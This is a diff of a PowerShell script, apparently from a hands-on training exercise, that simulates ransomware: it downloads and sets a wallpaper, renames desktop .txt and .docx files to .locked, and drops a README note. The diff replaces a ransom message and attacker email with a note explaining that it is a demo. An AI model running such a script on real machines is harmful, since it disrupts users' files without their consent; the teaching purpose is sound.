@@ -8,9 +8,8 @@ $desktop = [Environment]::GetFolderPath("Desktop")
 
 # ▼ 警告ファイル
 $warning = @"
-あなたのファイルは暗号化されました。
-復号キーを取得するには、以下に連絡してください：
-cyber.attacker.demo@gmail.com
+※今回はハンズオン用の演出のため、拡張子を元に戻せば問題なくファイルは元通りになります。
+実際にはこのようなテキストファイルに身代金の支払い方法と締め切り日などが記載されます。
 "@
 
 # GitHubから画像ダウンロード
@@ -29,13 +28,18 @@ public class Wallpaper {
 Add-Type $code
 [Wallpaper]::SystemParametersInfo(20, 0, $imgPath, 3)
 
-# デスクトップ上の .txt ファイルを改名
-Get-ChildItem $desktop -Filter *.txt | ForEach-Object {
-    Rename-Item $_.FullName ($_.Name + ".locked")
+# デスクトップ上の .txt と .docx ファイルをリネーム
+$targetExtensions = @("*.txt", "*.docx")
+
+foreach ($ext in $targetExtensions) {
+    Get-ChildItem $desktop -Filter $ext | ForEach-Object {
+        $newName = "$($_.Name).locked"
+        Rename-Item -Path $_.FullName -NewName $newName -Force
+    }
 }
 
 # 警告テキスト出力
-Set-Content -Path "$desktop\README_復元したくない人は読まないでください.txt" -Value $warning
+$warning | Out-File -FilePath "$desktop\README_復元したい人用.txt" -Encoding utf8
 
 # メッセージ表示
 Add-Type -AssemblyName PresentationFramework
